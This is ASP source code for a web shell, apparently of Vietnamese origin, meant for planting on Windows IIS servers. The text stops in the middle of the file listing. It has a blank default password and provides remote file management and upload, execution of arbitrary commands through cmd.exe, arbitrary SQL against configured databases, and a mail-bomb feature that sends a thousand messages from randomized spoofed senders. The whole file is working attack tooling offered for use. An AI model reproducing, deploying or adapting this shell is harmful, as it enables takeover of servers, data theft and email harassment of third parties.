<%

' Tac gia: forever5pi (theo huong dan cua anh vicki-vkdt)
' Email : forever5pi@yahoo.com
' Website: http://vnhacker.org

option explicit

Server.ScriptTimeout=10000
Response.Buffer=false

dim gURL,gMsg
dim targetPath,cp_dst,mv_dst,root
dim FSO,re
dim zombie_array,special_array

' ###################################### CONFIGURATION ######################################

const gPassword="" ' mat khau ("" : khong dung password)

const gMax=50 ' chieu dai toi da cho ten file
const gBomb=1000 ' so luong mail mac dinh can bomb

const lnkExt="lnk,url"
const editExt="htm,html,asp,asa,txt,inc,css,aspx,js,vbs,shtm,shtml,xml,xsl,log,ini,bat,bak" ' danh sach cac file cho phep edit

const TmpDir="C:\" ' thu muc tam thoi mac dinh
const Shell="cmd.exe" ' shell mac dinh

' cac chuoi ket noi mac dinh
const cstrMSSQL = "Provider=SQLOLEDB;Data Source=SERVER_NAME;database=DB_NAME;uid=UID;pwd=PWD"
const cstrJET = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=full_path/db_file.mdb" 
const cstrACCESS = "DRIVER={Microsoft Access Driver (*.mdb)}; DBQ=full_path/db_file.mdb"
const cstrORACLE = "Provider=OraOLEDB.Oracle.1; Data Source=DB_NAME; User ID=UID; Password=PWD"
const cstrMYSQL = "Driver=MySQL;server=SERVER_IP;uid=UID;pwd=PWD;database=DB_NAME"
const cstrDSN = "DSN_NAME"

const bSize=false' co/khong hien folder-size

const charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-" ' tap ki thu dung de sinh chuoi ngau nhien

zombie_array=array("com","net","org","info","vn","cn") ' mang cac domain z0mbie
special_array=array("yahoo.com","hotmail.com") ' mang cac domain dac biet (dung trong bomb mail)

root=Server.MapPath(".") ' folder mac dinh

' ###########################################################################################

gURL=Request.ServerVariables("SCRIPT_NAME")
Init()
if (LCase(Left(Request.ServerVariables("HTTP_CONTENT_TYPE"),19))="multipart/form-data") and (Session("allow")=1) and (Session("mode")=0) then Upload()
Secure()
if Request.Form("command")="Logout" then Logout()
if Request.Form("command")="ChangeMode" then
Session("mode")=Request.Form("mode")
Session("switch")=true
end if
select case Session("mode")
case 0 myFile()
case 1 myCMD()
case 2 mySQL()
case 3 myMail()
end select

'###########################################################################################

sub myFile()
if Session("switch")=true then
targetPath=Session("targetPath")
if targetPath="" then targetPath=root
Session("switch")=false
else
targetPath=Trim(Request.Form("folder"))
if targetPath="" then targetPath=root else targetPath=abspath(targetPath)

select case Request.Form("command")
case "Download"
Download()
exit sub
case "Edit"
Editor()
exit sub
case "ChangeAttributesFile","ChangeAttributesFolder"
ChangeAttributesItem()
exit sub
case "Tree"
Tree()
exit sub
case "Delete" Delete()
case "Move" Move()
case "Copy" Copy()
case "ZipInfo" ZipInfo()
case "NewFile","NewFolder" CreateItem()
case "RenameFile","RenameFolder" RenameItem()
case "OpenFolder" OpenFolder()
case "LevelUp" targetPath=FSO.GetParentFolderName(abspath(Request.Form("folder")))
case "LevelRoot" targetPath=findroot(abspath(Request.Form("folder")))
end select

Session("targetPath")=targetPath
end if

HtmlHeader("")
HtmlMode()
List()
HtmlFooter()
Destroy()
end sub

'###########################################################################################

sub myCMD()
dim bDoIt
dim bEcho
dim szTmpDir,szShell,szCmd,szTmpFile
dim oScript,oScriptNet,oFile

HtmlHeader("")
HtmlMode()

set oScript=Server.CreateObject("Wscript.Shell")
set oScriptNet=Server.CreateObject("Wscript.Network")

szTmpDir=Trim(Request.Form("tmpdir"))
szShell=Trim(Request.Form("shell"))
szCmd=Trim(Request.Form("cmd"))
bEcho=CBool(Request.Form("echo"))

if Session("switch")=true then
Session("switch")=false
bDoit=false
szTmpDir=Session("szTmpDir")
szShell=Session("szShell")
szCmd=Session("szCmd")
bEcho=Session("bEcho")
else
bDoIt=true
end if

if szTmpDir="" then szTmpDir=TmpDir else szTmpDir=abspath(szTmpDir)
if szShell="" then szShell=Shell

Session("szTmpDir")=szTmpDir
Session("szShell")=szShell
Session("szCmd")=szCmd
Session("bEcho")=bEcho

%>
<form name=frmCMD method=post action="<%=gURL%>">
<table>
<tr><td><b>T</b>mpDir:</td><td><input type=text name=tmpdir value="<%=Server.HtmlEncode(szTmpDir)%>" size=20></td></tr>
<tr><td><b>S</b>hell:</td><td><input type=text name=shell value="<%=Server.HtmlEncode(szShell)%>" size=20></td></tr>
<tr><td><b>C</b>md:</td><td><input type=text name=cmd value="<%=Server.HtmlEncode(szCmd)%>" size=80> <input type=submit value=Go></td></tr>
<tr><td><b>E</b>cho:</td><td><input type=checkbox name=echo value=1<%if bEcho then Response.Write " checked"%>></td></tr>
</table>
</form>
<script>frmCMD.cmd.focus()</script>
<%
if (szCmd<>"") and (bDoIt=true) then
if bEcho then
call oScript.Run(szShell & " /c " & szCmd)
else
szTmpFile = addslash(szTmpDir) & FSO.GetTempName
call oScript.Run(szShell & " /c " & szCmd & " > " & szTmpFile, 0, true)
if FSO.FileExists(szTmpFile) then set oFile=FSO.OpenTextFile (szTmpFile, 1, false, 0)
end if
end if
%>
<p><%=FormatDate(Now)%>
<p><b>I</b>P: <%=Request.ServerVariables("LOCAL_ADDR")%><br>
<b>U</b>ser: \\<%=oScriptNet.ComputerName%>\\<%=oScriptNet.UserName%>
<%
if (IsObject(oFile)) then
on error resume next
%>
<pre>
<%=Server.HtmlEncode(oFile.ReadAll)%>
</pre>
<%
oFile.Close
call FSO.DeleteFile(szTmpFile, true)
end if

set oScript=nothing
set oScriptNet=nothing

HtmlFooter()
Destroy()
end sub

'###########################################################################################

sub mySQL()
dim szConn,szSQL1,szSQL2,szSQL,bDoIt
dim intChoice

HtmlHeader("")
HtmlMode()

szConn=Trim(Request.Form("conn"))
szSQL1=Trim(Request.Form("sql1"))
szSQL2=Trim(Request.Form("sql2"))
intChoice=CInt(Request.Form("choice"))

if Session("switch")=true then
Session("switch")=false
bDoIt=false
szConn=Session("szConn")
szSQL1=Session("szSQL1")
szSQL2=Session("szSQL2")
intChoice=Session("intChoice")
else
bDoIt=true
end if

if intChoice=0 then intChoice=1
if intChoice=1 then szSQL=szSQL1 else szSQL=szSQL2

Session("szConn")=szConn
Session("szSQL1")=szSQL1
Session("szSQL2")=szSQL2
Session("intChoice")=intChoice

select case trim(ucase(szConn))
case "MSSQL" 
szConn=cstrMSSQL
szSQL=""
case "JET"
szConn=cstrJET
szSQL=""
case "ACCESS"
szConn=cstrACCESS
szSQL=""
case "ORACLE"
szConn=cstrORACLE
szSQL=""
case "MYSQL"
szConn=cstrMYSQL
szSQL=""
case "DSN"
szConn=cstrDSN
szSQL=""
end select
%>
<input type=button value="<->" onclick="changeInput()">
<form name=frmSQL method=post action="<%=gURL%>">
<input type=hidden name=choice value="<%=intChoice%>">
<b>C</b>onn: <input type=text name=conn value="<%=Server.HtmlEncode(szConn)%>" size=90> <br>
<b>S</b>QL:  <span id=s1<%if intChoice=2 then Response.Write " style=""display:none"""%>><input type=text name=sql1 value="<%=Server.HtmlEncode(szSQL1)%>" size=90></span>
<span id=s2<%if intChoice=1 then Response.Write " style=""display:none"""%>>( [F9] = Go )<br><textarea name=sql2 cols=42 rows=12 onkeydown="if (event.keyCode==120) frmSQL.submit();"><%=Server.HtmlEncode(szSQL2)%></textarea><br></span>
<input type=submit value=Go>
</table>
</form>
<script>
frmSQL.<%if szConn="" then Response.Write "conn" else Response.Write "sql"&intChoice%>.focus();
frmSQL.<%if szConn="" then Response.Write "conn" else Response.Write "sql"&intChoice%>.focus();
function changeInput() {
if (s1.style.display=='none') {
s1.style.display='inline';
s2.style.display='none';
frmSQL.choice.value="1";
frmSQL.sql1.focus();
} else {
s1.style.display='none';
s2.style.display='inline';
frmSQL.choice.value="2";
frmSQL.sql2.focus();
}
}
</script>
<%
if (szConn<>"") and (szSQL<>"") and (bDoIt=true) then
dim adoCon, rS
dim i,intAffected

set adoCon=Server.CreateObject("ADODB.Connection")
adoCon.Open szConn
set rS=adoCon.Execute(szSQL, intAffected)
if (rS.Fields.Count>0) then
' hien thi ten cua cac truong
Response.Write "<table border=1>" & vbNewLine & "<tr>"
for i=0 to rS.Fields.Count-1
Response.Write "<td><tt><b>"
if (rS.Fields(i).Name="") then
Response.Write "(No column name)"
else
Response.Write Server.HtmlEncode(rS.Fields(i).Name)
end if
Response.Write "</b></tt></td>"
next
Response.Write "</tr>" & vbNewLine
' hien thi du lieu tren cac dong
on error resume next
rS.MoveFirst
do while not rS.EOF
Response.Write "<tr>"
for i=0 to rS.Fields.Count-1
Response.Write "<td><tt>"
if IsNull(rs.Fields(i).Value) then
Response.Write "NULL"
elseif (Trim(rs.Fields(i).Value)="") then
Response.Write " "
else
Response.Write Server.HtmlEncode(rS.Fields(i).Value)
end if
Response.Write "</tt></td>"
next
Response.Write "</tr>" & vbNewLine
rS.MoveNext
loop
rS.Close
Response.Write "</table>" & vbNewLine
end if

Response.Write "<p><tt>(" & intAffected & " row(s) affected)</tt>"

set rS=nothing
set adoCon=nothing
end if

HtmlFooter()
Destroy()
end sub


'###########################################################################################

sub myMail()
dim strFrom,strTo,strSubject,strBody,bHtml,intNumber,i,StartTime,EndTime,bDoIt
dim objMail,objMsg

strTo=Trim(Request.Form("to"))

select case Request.Form("subcommand")
case "Send"
strFrom=Trim(Request.Form("from"))
strSubject=Trim(Request.Form("subject"))
strBody=Request.Form("body")
bHtml=CBool(Request.Form("html"))
case "Bomb"
if IsNumeric(Request.Form("number")) then intNumber=Int(Request.Form("number"))
strFrom=Session("strFrom")
strSubject=Session("strSubject")
strBody=Session("strBody")
bHtml=Session("bHtml")
end select

if Session("switch")=true then
Session("switch")=false
bDoIt=false
strFrom=Session("strFrom")
strTo=Session("strTo")
strSubject=Session("strSubject")
strBody=Session("strBody")
bHtml=Session("bHtml")
intNumber=Session("intNumber")
else
bDoIt=true
end if

if (intNumber<=0) then intNumber=gBomb

Session("strFrom")=strFrom
Session("strTo")=strTo
Session("strSubject")=strSubject
Session("strBody")=strBody
Session("bHtml")=bHtml
Session("intNumber")=intNumber

HtmlHeader("")
HtmlMode()

if bDoIt then
select case Request.Form("subcommand")
case "Send"
if IsValidEmail(strTo) then
set objMail=Server.CreateObject("CDONTS.NewMail")
objMail.To=strTo
objMail.From=strFrom
objMail.Subject=strSubject
objMail.Body=strBody
if bHtml then
objMail.BodyFormat=0 'HTML
objMail.MailFormat=0 'MIME
end if
objMail.Send
set objMail=nothing
Response.Write "<b>M</b>essage was sent to " & strTo & " successfully." & vbNewLine
end if
case "Bomb"
if IsValidEmail(strTo) then
Response.Write "<b>B</b>ombing " & Replace(FormatNumber(intNumber,0),",",".") & " mail"
if intNumber>1 then Response.Write "s"
Response.Write " to " & strTo & " ... "
StartTime=Timer
set objMsg=Server.CreateObject("CDO.Message")
objMsg.To=strTo
Randomize
for i=1 to intNumber
objMsg.From=makeEmail()
objMsg.Subject=makeText(Int((50-25+1)*Rnd+25))
objMsg.TextBody=makeText(Int((100-50+1)*Rnd+50))
objMsg.Send
next
set objMsg=nothing
EndTime=Timer
Response.Write howlong(EndTime-StartTime) & vbNewLine
end if
end select
end if
%>
<p>
<table border=1>
<tr>
<td width=50%>
<form name=frmSend method=post action="<%=gURL%>">
<table>
<tr>
<td colspan=2>a) <b>A</b>nonymous Mail</td>
</tr>
<tr>
<td><b>F</b>rom:</td>
<td><input type=text name=from value="<%=Server.HtmlEncode(strFrom)%>" size=25></td>
</tr>
<tr>
<td><b>T</b>o:</td>
<td><input type=text name=to value="<%=Server.HtmlEncode(strTo)%>" size=25></td>
</tr>
<tr>
<td><b>S</b>ubject:</td>
<td><input type=text name=subject value="<%=Server.HtmlEncode(strSubject)%>" size=50></td>
</tr>
<tr>
<td valign=top><b>B</b>ody:</td>
<td><textarea name=body cols=37 rows=12><%=Server.HtmlEncode(strBody)%></textarea></td>
</tr>
<tr>
<td><b>H</b>tml:</td>
<td><input type=checkbox name=html value=1<%if bHtml=true then Response.Write " checked"%>></td>
</tr>
<tr>
<td colspan=2><input type=submit name=subcommand value=Send></td>
</tr>
</table>
</form>
</td>
<td width=50% valign=top>
<form name=frmBomb method=post action="<%=gURL%>">
<table>
<tr>
<td colspan=2>b) <b>B</b>omb Mail</td>
</tr>
<tr>
<td><b>A</b>ddress:</td>
<td><input type=text name=to value="<%=Server.HtmlEncode(strTo)%>" size=25></td>
</tr>
<tr>
<td><b>N</b>umber:</td>
<td><input type=text name=number value=<%=intNumber%>></td>
</tr>
<tr>
<td colspan=2><input type=submit name=subcommand value=Bomb></td>
</tr>
</table>
</form>
</td>
</tr>
</table>
<%
HtmlFooter()
Destroy()
end sub

'###########################################################################################

function IsValidEmail(strEAddress)
dim objRegExpr
set objRegExpr = New RegExp
objRegExpr.Pattern = "^[a-zA-Z0-9][\w\.-]*[a-zA-Z0-9]@[\w-\.]*[a-zA-Z0-9]\.[a-zA-Z]{2,7}$"
objRegExpr.Global = true
objRegExpr.IgnoreCase = False
IsValidEmail = objRegExpr.Test(strEAddress)
set objRegExpr = nothing
end function

'###########################################################################################

function makeEmail()
Randomize
if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & "@" & makeText(8) & "." & zombie_array(Int((UBound(zombie_array)-0+1)*Rnd+0)) else makeEmail=makeText(8) & "@" & special_array(Int((UBound(special_array)-0+1)*Rnd+0))
end function

'###########################################################################################

function makeText(intLen)
dim strNewText,i
strNewText=""
Randomize
for i=1 to intLen
strNewText=strNewText & Mid(charset,Int((Len(charset)-1+1)*Rnd+1),1)
next
makeText=strNewText
end function

'###########################################################################################

function howlong(intTime)
if (intTime<60) then
howlong=intTime & " second(s)"
elseif (intTime<60*60) then
howlong=FormatNumber(intTime/60,2) & " minute(s)"
else
howlong=FormatNumber(intTime/(60*60),2) & " hour(s)"
end if
end function

'###########################################################################################

sub Tree()
dim path
path=abspath(Request.Form("param"))
if FSO.FolderExists(path) then
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><%=path%></title>
<style>
body,td{font-family:Fixedsys}
a{color:#0000ff}
</style>
</head>
<body bgcolor=#000000 text=#ffffff>
<%
tree_dir(path)
%>
</body>
</html>
<%
else
%>
<script>alert('Folder not found !');window.close();</script>
<%
end if
Destroy()
end sub

sub tree_dir(path)
dim strAttrib,strSize

on error resume next

dim oFolder
dim oSubFolders,oSubFolder
dim oFiles,oFile
dim oSubFolders2,oSubFolder2
dim oFiles2,oFile2

set oFolder=FSO.GetFolder(path)
set oSubFolders=oFolder.SubFolders
set oFiles=oFolder.Files

Response.Write "<p>" & FSO.GetAbsolutePathName(path)

strAttrib=GetAttributes(oFolder.Attributes)

if strAttrib<>" " then Response.Write " (" & GetAttributes(oFolder.Attributes) & ")"

Response.Write vbNewLine

if (oSubFolders.Count>0) or (oFiles.Count>0) then
%>
<table border=0 cellspacing=1 cellpadding=2 bgcolor=#ff0000>
<tr bgcolor=#000000>
<td><font color=#FFFF00>Name</font></td>
<td align=center><font color=#FFFF00>Size</font></td>
<td align=center><font color=#FFFF00>Type</font></td>
<td align=center><font color=#FFFF00>Modified</font></td>
<td align=center><font color=#FFFF00>Attributes</font></td>
</tr>
<%
' liet ke thu muc
for each oSubFolder in oSubFolders
%>
<tr bgcolor=#000000>
<td><%=oSubFolder.Name%></td>
<td align=right> </td>
<td align=center>DIR</td>
<td align=center><%=FormatDate(oSubFolder.DateLastModified)%></td>
<td><%=GetAttributes(oSubFolder.Attributes)%></td>
</tr>
<%
next

' liet ke file
for each oFile in oFiles
%>
<tr bgcolor=#000000>
<td<%if (FSO.GetExtensionName(path & "\" & oFile.Name)="lnk") or (FSO.GetExtensionName(path & "\" & oFile.Name)="url") then Response.Write " title=""" & FindLink(path & "\" & oFile.Name) & """"%>><%=oFile.Name%></td>
<td align=right><%=FormatSize(oFile.Size)%></td>
<td align=center><%=oFile.Type%></td>
<td align=center><%=FormatDate(oFile.DateLastModified)%></td>
<td><%=GetAttributes(oFile.Attributes)%></td>
</tr>
<%
next
strSize=FormatSize(oFolder.Size)
%>
<tr bgcolor=#000000>
<td colspan=5 align=center><%=oSubFolders.Count%> folder(s), <%=oFiles.Count%> file(s)<%if strSize<>"" then Response.Write " (" & strSize & ")"%></td>
</tr>
</table>
<%
' goi de qui
for each oSubFolder in oSubFolders
set oSubFolder2=oSubFolder.SubFolders
set oFile2=oSubFolder.Files

if (oSubFolder2.Count>0) or (oFile2.Count>0) then
tree_dir(oSubFolder.ParentFolder & "\" & oSubFolder.Name)
end if

set oSubFolder2=nothing
set oFile2=nothing
next
end if

set oSubFolder=nothing
set oFiles=nothing
set oFolder=nothing
end sub

'###########################################################################################

sub Editor()
dim f,name,path

on error resume next

HtmlHeader("")

name=Request.Form("param")
path=addslash(targetPath) & name

select case Request.Form("subcommand")
case "Save","SaveAs"
set f=FSO.OpenTextFile(path,2,true,-2)
if Err.Number<>0 then
gMsg="Can not write to the file """ & name & """, permission denied!"
Err.Clear
else
f.Write Request.Form("content")
end if
set f=nothing
set f=FSO.OpenTextFile(path,1,false,-2)
case else
if not FSO.FileExists(path) then
gMsg="The file """ & name & """ does not exist"
set f=FSO.CreateTextFile(path,false)
if Err.Number<>0 then
gMsg=gMsg & ", also unable to create new file."
Err.Clear
else
gMsg=gMsg & ", created new file."
end if
else
set f=FSO.OpenTextFile(path,1,false,-2)
if Err.Number<>0 then
gMsg="Can not read from the file """ & name & """, permission denied!"
Err.Clear
end if
end if
end select
%>
<% if gMsg<>"" then Response.Write "<script>alert('" & gMsg & "')</script>" & vbNewLine %>
<p><b>E</b>diting - "<%=path%>"<br>
<form name=frmFile method=post action="<%=gURL%>">
<b>W</b>rap<input type=checkbox id=wrap onclick="EditorCommand('WordWrap')">
<center>
<table width=100%>
<tr><td align=center>
<textarea name=content rows=25 cols=46 style="width:580;height:330" wrap=off><%=Server.HTMLEncode(f.ReadAll)%></textarea>
</td></tr>
<tr><td align=center>
<input type=button value=Save onclick="EditorCommand('Save')"> <input type=button value="Save As" onclick="EditorCommand('SaveAs')"> <input type=button value=Reload onclick="EditorCommand('Reload')"> <input type=button value=Close onclick="window.close()">
</td></tr>
</table>
</center>
<script>frmFile.content.focus()</script>
<input type=hidden name=command value=Edit>
<input type=hidden name=subcommand value="">
<input type=hidden name=param value="<%=name%>">
<input type=hidden name=folder value="<%=Request.Form("folder")%>">
</form>
<%
set f=nothing
HtmlJsEditor()
HtmlFooter()
Destroy()
end sub

'###########################################################################################

sub ChangeAttributesItem()
dim item,itemType,itemName,itemPath,itemAttrib

itemType=Request.Form("command")
itemName=Request.Form("param")
itemPath=addslash(targetPath) & itemName

HtmlHeader("")

select case itemType
case "ChangeAttributesFile" set item=FSO.GetFile(itemPath)
case "ChangeAttributesFolder" set item=FSO.GetFolder(itemPath)
end select

if Request.Form("subcommand")="change" then
itemAttrib=int(Request.Form("r"))
itemAttrib=itemAttrib+int(Request.Form("h"))
itemAttrib=itemAttrib+int(Request.Form("a"))
itemAttrib=itemAttrib+int(Request.Form("s"))
on error resume next
item.Attributes=int(itemAttrib)
if Err.Number<>0 then Response.Write "<script>alert('Permission denined')</script>" & vbNewLine
end if

itemAttrib=item.Attributes
%>
<b>C</b>hange attributes - "<%=itemName%>"
<p align=center>
<form name=frmAttrib method=post action="<%=gURL%>">
<input type=hidden name=command value="<%=itemType%>">
<input type=hidden name=subcommand value=change>
<input type=hidden name=folder value="<%=targetPath%>">
<input type=hidden name=param value="<%=itemName%>">
<table>
<tr>
<td><input type=checkbox name=r value=1 <%if (itemAttrib and 1)>0 then Response.Write " checked"%>>Read-only</td>
<td><input type=checkbox name=h value=2 <%if (itemAttrib and 2)>0 then Response.Write " checked"%>>Hidden</td>
</tr>
<tr>
<td><input type=checkbox name=a value=32 <%if (itemAttrib and 32)>0 then Response.Write " checked"%>>Archive</td>
<td><input type=checkbox name=s value=4 <%if (itemAttrib and 4)>0 then Response.Write " checked"%>>System</td>
</tr>
</table><br>
<input type=button value=OK onclick="frmAttrib.submit()"> <input type=button value=Close onclick="window.close()">
</form>
</p>
<%
set itemType=nothing
HtmlFooter()
Destroy()
end sub

'###########################################################################################

sub OpenFolder()
if Trim(Request.Form("folder"))="" then 
if Trim(Request.Form("param"))="" then targetPath=root else targetPath=abspath(Trim(Request.Form("param")))
else
targetPath=addslash(Trim(Request.Form("folder"))) & Trim(Request.Form("param"))
end if
end sub

'###########################################################################################

sub CreateItem()
dim itemType,itemName,itemPath 
itemType=request.form("command")
itemName=request.form("param")
itemPath=addslash(targetPath) & itemName

on error resume next

select case itemType
case "NewFolder"
if (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then
FSO.CreateFolder(itemPath)
if Err.Number<>0 then
gMsg="Unable to create the folder """ & itemName & """, an error occured..."
else
gMsg="Created the folder """ & itemName & """..."
end if
else
gMsg="Unable to create the folder """ & itemName & """, there exists a file or a folder with the same name..."
end if
case "NewFile"
if (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then
FSO.CreateTextFile(itemPath)
if Err.Number<>0 then
gMsg="Unable to create the file """ & itemName & """, an error occured..."
else
gMsg="Created the file """ & itemName & """..."
end if
else
gMsg="Unable to create the file """ & itemName & """, there exists a file or a folder with the same name..."
end if
end select
end sub

'###########################################################################################

sub ZipInfo()
dim path,zip,zipfile,i

path=addslash(targetPath) & Request.Form("param")
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><%=path%></title>
<style>
body,td{font-family:Fixedsys}
a{color:#0000ff}
</style>
</head>
<body bgcolor=#000000 text=#ffffff>
<p><%=path%>
<table border=0 cellspacing=1 cellpadding=2 bgcolor=#ff0000>
<tr bgcolor=#000000>
<td><font color=#FFFF00>Name</font></td>
<td align=center><font color=#FFFF00>Size</font></td>
<td align=center><font color=#FFFF00>Ratio</font></td>
<td align=center><font color=#FFFF00>Packed</font></td>
<td align=center><font color=#FFFF00>Modify</font></td>
<td align=center><font color=#FFFF00>Path</font></td>
</tr>
<%
set zip=new clszip
zip.ZipLoad(path)
set zipfile=new clsZipFile

for i=1 to zip.FileCount
set zipfile=zip.GetFile(i)
with zipfile
if not (.IsFolder Or .IsOverall) then
Response.Write "<tr bgcolor=#000000>" & vbNewLine
Response.Write " <td>" & .Name & "</td>" & vbNewLine
Response.Write " <td align=right>" & FormatNumber(.Size,0) & "</td>" & vbNewLine
Response.Write " <td align=right>" & .Ratio & "</td>" & vbNewLine
Response.Write " <td align=right>" & FormatNumber(.Packed,0) & "</td>" & vbNewLine
Response.Write " <td align=center>" & FormatDate(.Modified) & "</td>" & vbNewLine
Response.Write " <td>" & .Path & "</td>" & vbNewLine
end if
end with
next

set ZipFile=nothing
set zip=nothing
%>
</table>
</p>
<%
HtmlFooter()
Destroy()
end sub

'###########################################################################################

sub Delete()
dim i,ndir,nfile,itemName,itemPath

on error resume next

ndir=Request.Form("d").Count
nfile=Request.Form("f").Count

if (ndir>0) then
gMsg="<b>D</b>elete folder(s)..."
for i=1 to ndir
itemName=Request.Form("d")(i)
itemPath=addslash(targetPath) & itemName
FSO.DeleteFolder itemPath,true
gMsg=gMsg & "<br>" & vbNewLine & "- " & itemName & ": "
if Err.Number<>0 then
gMsg=gMsg & "error"
else
gMsg=gMsg & "success"
end if
next
end if

if (nfile>0) then
if (ndir>0) then gMsg= gMsg & "<p>" & vbNewLine
gMsg=gMsg & "<b>D</b>elete file(s)..."
for i=1 to nfile
itemName=Request.Form("f")(i)
itemPath=addslash(targetPath) & itemName
FSO.DeleteFile itemPath,true
gMsg=gMsg & "<br>" & vbNewLine & "- " & itemName & ": "
if Err.Number<>0 then
gMsg=gMsg & "error"
else
gMsg=gMsg & "success"
end if
next
end if

end sub

'###########################################################################################

sub Copy()
dim i,nfile,ndir,itemName,itemPath

on error resume next

cp_dst=Trim(Request.Form("cp"))
if cp_dst="" then exit sub
cp_dst=abspath(cp_dst)
Session("cp_dst")=cp_dst

if FSO.FolderExists(cp_dst)=false then
gMsg="<p>Folder not exists" & vbNewLine
exit sub
end if

ndir=Request.Form("d").Count
nfile=Request.Form("f").Count

if (ndir>0) then
gMsg="<b>C</b>opying folder(s) to """ & cp_dst & """ ..."
for i=1 to ndir
itemName=Request.Form("d")(i)
itemPath=addslash(targetPath) & itemName
FSO.CopyFolder itemPath,addslash(cp_dst),true
gMsg=gMsg & "<br>" & vbNewLine & "- " & itemName & ": "
if Err.Number<>0 then
gMsg=gMsg & "error"
else
gMsg=gMsg & "success"
end if
next
end if

if (nfile>0) then
if (ndir>0) then gMsg= gMsg & "<p>" & vbNewLine
gMsg=gMsg & "<b>C</b>opying file(s) to """ & cp_dst & """ ..."
for i=1 to nfile
itemName=Request.Form("f")(i)
itemPath=addslash(targetPath) & itemName
FSO.CopyFile itemPath,addslash(cp_dst),true
gMsg=gMsg & "<br>" & vbNewLine & "- " & itemName & ": "
if Err.Number<>0 then gMsg=gMsg & "error" else gMsg=gMsg & "success"
next
end if

end sub

'###########################################################################################

sub Move()
dim i,nfile,ndir,itemName,itemPath

on error resume next

mv_dst=Trim(Request.Form("mv"))
if mv_dst="" then exit sub
mv_dst=abspath(mv_dst)
Session("mv_dst")=mv_dst

if FSO.FolderExists(mv_dst)=false then
gMsg="<p>Folder not exists" & vbNewLine
exit sub
end if

ndir=Request.Form("d").Count
nfile=Request.Form("f").Count

if (ndir>0) then
gMsg="<b>M</b>oving folder(s) to """ & mv_dst & """ ..."
for i=1 to ndir
itemName=Request.Form("d")(i)
itemPath=addslash(targetPath) & itemName
gMsg=gMsg & "<br>" & vbNewLine & "- " & itemName & ": "
FSO.MoveFolder itemPath,addslash(mv_dst)
if Err.Number<>0 then gMsg=gMsg & "error" else gMsg=gMsg & "success"
set item=nothing
next
end if

if (nfile>0) then
if (ndir>0) then gMsg= gMsg & "<p>" & vbNewLine
gMsg=gMsg & "<b>M</b>oving file(s) to """ & mv_dst & """ ..."
for i=1 to nfile
itemName=Request.Form("f")(i)
itemPath=addslash(targetPath) & itemName
gMsg=gMsg & "<br>" & vbNewLine & "- " & itemName & ": "
FSO.MoveFile itemPath,addslash(mv_dst)
if Err.Number<>0 then gMsg=gMsg & "error" else gMsg=gMsg & "success"
next
end if
end sub

'###########################################################################################

sub RenameItem()
dim item,itemType,itemName,itemPath
dim param,newName

itemType=request.form("command")
param=split(request.form("param"),"|")
itemName=param(0)
newName=param(1)
itemPath=addslash(targetPath) & newName

on error resume next

select case itemType
case "RenameFolder"
if (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then
itemPath=addslash(targetPath) & itemName
set item=FSO.GetFolder(itemPath)
item.Name=newName
if Err.Number<>0 then
gMsg="Unable to rename the folder """ & itemName & """, an error occured..."
else
gMsg="Renamed the folder """ & itemName & """ to """ & newName & """..."
end if
else
gMsg="Unable to rename the folder """ & itemName & """, there exists a file or a folder with the new name """ & newName & """..."
end if
case "RenameFile"
if (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then
itemPath=addslash(targetPath) & itemName
set item=FSO.GetFile(itemPath)
item.Name=newName
if Err.Number<>0 then
gMsg="Unable to rename the file """ & itemName & """, an error occured..."
else
gMsg="Renamed the file """ & itemName & """ to """ & newName & """..."
end if
else
gMsg="Unable to rename the file """ & itemName & """, there exists a file or a folder with the new name """ & newName & """..."
end if
end select

set item=nothing
end sub

'###########################################################################################

sub List()
dim objFolder,folder,item,intCount,bOpen,ext,count
if not FSO.FolderExists(targetPath) then
gMsg="Folder not found"
else
on error resume next
set objFolder=FSO.GetFolder(targetPath)
if Err.Number<>0 then
gMsg="Can't open folder"
else
intCount=objFolder.SubFolders.Count+objFolder.Files.Count
if Err.Number<>0 then
gMsg="Permission denied"
else
%>
<input type=button value=Refresh onclick="Command('Refresh')">
<input type=button value="New File" onclick="Command('NewFile')">
<input type=button value="New Folder" onclick="Command('NewFolder')">
<input type=button value=Upload onclick="frmUpload.max.focus()">
<input type=button value=Tree onclick="Command('Tree')">
<%
bOpen=true
end if
end if
end if
HtmlQuick()
if gMsg<>"" then Response.Write "<p>" & gMsg & vbNewLine
if bOpen then
count=0
if intCount>0 then Response.Write "<p>" & objFolder.SubFolders.Count & " subfolder(s)<br>" & vbNewLine & objFolder.Files.Count & " file(s)<br>" & vbNewLine
if bSize then Response.Write "(" & FormatSize(objFolder.Size) & ")<br>" & vbNewLine
%>
<p>
<table border=1 width=100%>
<tr>
<td><b>N</b>ame</td>
<td align=center><b>S</b>ize</td>
<td align=center><b>T</b>ype</td>
<td align=center><b>M</b>odified</td>
<td><b>A</b>ttributes</td>
<td><b>A</b>ctions</td>
<tr>
<%
if not isroot(targetPath) then
%>
<tr>
<td><a href="javascript:Command('LevelRoot')" title="Up Root Level">\</a></td>
<td> </td>
<td align=center>Root</td>
<td> </td>
<td> </td>
<td> </td>
</tr>
<tr>
<td><a href="javascript:Command('LevelUp')" title="Up One level">..</a></td>
<td> </td>
<td align=center>Up</td>
<td> </td>
<td> </td>
<td> </td>
</tr>
<%
end if
if intCount>0 then
HtmlJsForm()
%>
<form name=theForm method=post action="<%=gURL%>">
<input type=hidden name=command value="">
<input type=hidden name=folder value="<%=targetPath%>">
<%
for each item in objFolder.SubFolders
count=count+1
Response.Write "<tr>" & vbNewLine
Response.Write " <td><a href=""javascript:Command('OpenFolder',"" & item.Name & "")""" 
if Len(item.Name)>gMax then Response.Write " title=""" & item.Name & """"
Response.Write ">" & FormatName(item.Name) & "</a></td>" & vbNewLine
Response.Write " <td align=right> </td>" & vbNewLine
Response.Write " <td align=center>DIR</td>" & vbNewLine
Response.Write " <td align=center>" & FormatDate(item.DateLastModified ) & "</td>" & vbNewLine
Response.Write " <td>" & GetAttributes(item.Attributes) & "</td>" & vbNewLine
